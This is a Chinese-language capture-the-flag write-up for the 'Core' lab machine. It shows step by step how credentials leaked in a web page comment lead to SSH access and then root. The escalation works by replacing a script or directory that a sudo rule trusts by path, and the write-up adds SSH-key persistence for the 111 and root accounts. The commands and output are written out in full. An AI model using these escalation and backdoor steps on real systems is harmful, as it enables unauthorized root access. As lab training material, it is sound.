# 靶机 Core — 渗透测试全过程记录

**目标 IP：** `192.168.1.234`
**系统环境：** Alpine Linux（busybox）
**难度：** 简单
**标签：** Web 源码注释信息泄露、弱凭据、SSH 初始访问、Sudo 滥用、脚本/目录替换提权

---

## 概述

Core 靶机是一台以权限提升为主题的入门靶机，攻击链如下：

1. 信息收集发现目标开放 SSH（22）与 HTTP（80），系统为 Alpine Linux（busybox）。
2. 在 Web 页面源码注释中发现一段疑似口令的字符串，结合路径上下文推测出用户 `ll104567` 的登录凭据。
3. 通过 SSH 以 `ll104567` 登录，获取用户级 flag `user.txt`。
4. `sudo -l` 枚举发现可免密以 `111` 身份执行家目录中的脚本；虽然脚本为 root 所有，但所在目录归当前用户可写，替换脚本后获得 `111` 身份。
5. `111` 的 sudo 规则允许以任意用户（含 root）执行 `/home/111/111/111.sh`；利用父目录写权限替换整个目录与脚本，`sudo` 以 root 执行，获取 root flag。

**核心一句话：** sudo 只按"路径"执行，不校验"路径上的文件是谁的"。只要目标脚本所在目录可写，就能把它换成自己的脚本。

## 四、权限提升（Privilege Escalation）

本靶机提权分两跳完成：`ll104567 → 111 → root`，两跳利用的是同一个套路——**sudo 按路径执行 + 路径所在目录可写 → 替换目标文件/目录**。

### 4.1 信息枚举 — Sudo 权限

```bash
ll104567@Core:~$ sudo -l
User ll104567 may run the following commands on Core:
    (111) NOPASSWD: /home/ll104567/12138.sh
```

**解读：** `ll104567` 可以**免密**以 **`111`** 的身份执行 `/home/ll104567/12138.sh`。sudo 规则只允许切换到 `111`，无法直接提 root——先拿下 111，再看 111 有什么权限。**提权经常是一级一级往上爬的。**

### 4.2 目标脚本分析（第一跳）

```bash
ll104567@Core:~$ ls -la 12138.sh
-rwxr-xr-x    1 root     root    2553 ... 12138.sh
```

**权限分析：**

| 对象 | 所有者 | 权限 | 可直接修改？ |
|------|--------|------|--------------|
| `/home/ll104567/12138.sh`（文件） | root:root | 755（`rwxr-xr-x`） | ❌ 无写权限 |
| `/home/ll104567/`（父目录） | ll104567 | `rwx` | ✅ 完全可写 |

### 4.3 提权路径评估

在确定最终方案前，逐一评估可能的绕过方式：

#### 方法一：直接修改脚本 ❌

```
问题：
- 脚本属主 root，ll104567 无写权限
- echo / vi / sed 直接写入均会被拒绝

结论：不可行
```

#### 方法二：注入脚本内部逻辑 ❌

```
问题：
- 脚本内容未知，无法确定存在可利用的命令注入点

结论：缺乏信息，不可行
```

#### 方法三：利用父目录写权限替换文件 ✅

```
关键洞察：
- 删除/替换一个文件，看的是它所在目录的权限，而不是文件本身的权限
- /home/ll104567 属主是 ll104567，拥有完全写权限（rwx）
- 可以把 root 属主的 12138.sh 移走，再新建同名文件
- sudo 执行时只校验"路径存在且可执行"，不校验文件内容与属主是否被换过

结论：可行
```

### 4.4 第一跳 — 替换脚本获取 111 身份

#### 设计思路

利用"**文件能否被删除取决于父目录写权限**"这一机制：脚本虽然 root 所有，但位于用户可写的家目录中，可移走原脚本并放置同名恶意脚本；由于 sudoers 仅记录路径，sudo 会忠实地执行被替换后的文件。

#### 利用过程

```bash
cd /home/ll104567

# 第一步：移走原脚本（利用目录写权限；mv 无法保留属主会报错，但文件已成功移走，可忽略）
mv 12138.sh /tmp/12138.sh.bak
# mv: can't preserve ownership of '/tmp/12138.sh.bak': Operation not permitted

# 验证原位置已无该脚本
ls /home/ll104567/

# 第二步：写入同名恶意脚本（此处仅为验证身份）
cat > 12138.sh <<'EOF'
#!/bin/bash
id; whoami
EOF

# 新建文件默认无执行权限，需手动添加
chmod +x 12138.sh

# 第三步：以 111 身份执行 → 输出 111 的身份信息
sudo -u 111 /home/ll104567/12138.sh
uid=1001(111) gid=1001(111) groups=1001(111)
```

**成功：已能任意以 111 的身份执行命令。**

#### 持久化 — 写入 111 的 SSH 公钥

每次重写脚本再触发过于繁琐，直接为 111 安装攻击机公钥，后续直接密钥登录：

```bash
# 攻击机本地生成密钥对
ssh-keygen -t ed25519 -f key_111 -N ""

# 恶意脚本改为：向 111 家目录写入公钥
cat > /home/ll104567/12138.sh <<'EOF'
#!/bin/bash
mkdir -p /home/111/.ssh
echo "ssh-ed25519 AAAA...你的公钥..." >> /home/111/.ssh/authorized_keys
chmod 700 /home/111/.ssh
chmod 600 /home/111/.ssh/authorized_keys
EOF

# 触发执行，公钥写入 111 的 authorized_keys
sudo -u 111 /home/ll104567/12138.sh

# 之后直接用密钥登录 111
ssh -i key_111 111@192.168.1.234
```

> 注：非 root 用户 `chown` 到其他属主会报 "Operation not permitted"，但此处的 authorized_keys 本就是 111 自己创建，属主正确，不影响 SSH 登录。

### 4.5 第二跳 — 替换整个目录获取 root

#### 4.5.1 信息枚举 — 111 的 Sudo 权限

```bash
111@Core:~$ sudo -l
User 111 may run the following commands on Core:
    (ALL : ALL) NOPASSWD: /home/111/111/111.sh
```

**解读：** `111` 可以**免密**、以**任意用户（包括 root）**的身份执行 `/home/111/111/111.sh`。这是通往 root 的门。

#### 4.5.2 目标分析

```bash
111@Core:~$ ls -la /home/111/111/
drwxr-xr-x  2 root root ... .
-rwxr-xr-x  1 root root ... 111.sh
```

**权限分析：**

| 对象 | 所有者 | 可直接修改？ |
|------|--------|--------------|
| `/home/111/111/`（目录） | root:root | ❌ 111 无写权限 |
| `/home/111/111/111.sh`（文件） | root:root | ❌ 无写权限 |
| `/home/111/`（父目录） | 111 | ✅ 完全可写 |

#### 4.5.3 提权路径评估

第一跳的套路似乎在这里失效——`/home/111/111` 目录本身是 root 所有的，111 无法在其中增删文件。但按同样的"父目录权限"原则继续推导：

| 方案 | 可行性 | 说明 |
|------|--------|------|
| 直接替换 `111.sh` | ❌ | 目录 root 所有，111 无目录写权限 |
| 修改 sudoers / 爆破 root 密码 | ❌ | 无此权限与信息 |
| **替换整个 `/home/111/111` 目录** | ✅ | `/home/111/111` 只是 `/home/111`（111 可写）里的一个条目；可重命名整个目录，再重建同名目录与同名脚本 |

**关键洞察：目录本身不可写，不代表目录不能被换掉——看它的父目录。** sudo 规则中写死的路径是 `/home/111/111/111.sh`，执行那一刻只要该路径存在且可执行，sudo 就执行，根本不关心目录/文件是不是刚被换过。

#### 4.5.4 利用过程

```bash
cd /home/111

# 第一步：把 root 的原目录整个改名搬走
mv 111 111.bak

# 第二步：重建同名目录
mkdir 111

# 第三步：放入我们自己的 111.sh
cat > 111/111.sh <<'EOF'
#!/bin/bash
id
whoami
EOF

chmod +x 111/111.sh

# 第四步：sudo 以 root 身份执行（规则为 ALL，默认即以 root 运行）
sudo /home/111/111/111.sh
uid=0(root) gid=0(root) groups=0(root),1(bin),...
root
```

**uid=0(root)！提权成功。** 本靶机的"点睛之笔"：**sudo 按路径执行 + 父目录可写 = 可替换目标目录/文件。**

#### 4.5.5 读取 Root Flag 并持久化

```bash
# 将脚本内容替换为读取 root 目录，或以 root 身份再执行一次
sudo /home/111/111/111.sh    # 脚本内容换成: cat /root/root.txt

flag{root-dfb18999777ea8a3177050c859c98c04}
```

顺手给 root 写入 SSH 公钥（环境允许 `PermitRootLogin yes`），以后直接：

```bash
ssh -i key_111 root@192.168.1.234
id
uid=0(root) ...
```

## 五、总结

### 攻击链回顾

```
Web 源码注释泄露凭据 → SSH 登录 ll104567 → user.txt
    → sudo 枚举（(111) NOPASSWD: /home/ll104567/12138.sh）
    → 家目录写权限替换脚本 → sudo -u 111 → 获得 111 身份
    → sudo 枚举（(ALL) NOPASSWD: /home/111/111/111.sh）
    → 父目录写权限替换整个目录 → sudo → root → root.txt
```

### 漏洞盘点

| 序号 | 漏洞类型 | 位置 | CWE | 严重性 |
|------|----------|------|-----|--------|
| 1 | 敏感信息明文暴露（源码注释含口令） | Web 页面源码 | CWE-200 / CWE-312 | 高危 |
| 2 | 弱凭据复用/猜测 | SSH 登录凭据 | CWE-521 | 中危 |
| 3 | Sudo 规则指向用户可写目录 | `/etc/sudoers` — `/home/ll104567/12138.sh` | CWE-269 | 高危 |
| 4 | 目录权限配置不当（父目录用户可写） | `/home/ll104567`、`/home/111` | CWE-276 | 中危 |

### 关键知识点

| 技巧 | 说明 |
|------|------|
| Web 源码注释审计 | 部署后残留的注释/测试口令是常见信息泄露入口 |
| sudo -l 优先枚举 | 提权第一步永远是看系统给当前用户开了什么"官方通道" |
| 文件权限 vs 目录权限 | 删除/替换文件需要的是**父目录**的写权限，而非文件本身的写权限 |
| sudo 按路径执行 | sudo 只校验路径存在且可执行，不校验文件属主/内容是否被替换 |
| 目录可被整体替换 | 目录本身不可写，不代表不能被换掉——检查其父目录权限 |
| 逐级提权 | sudo 规则允许切换到谁才能切换成谁，提权常需一级一级爬升 |
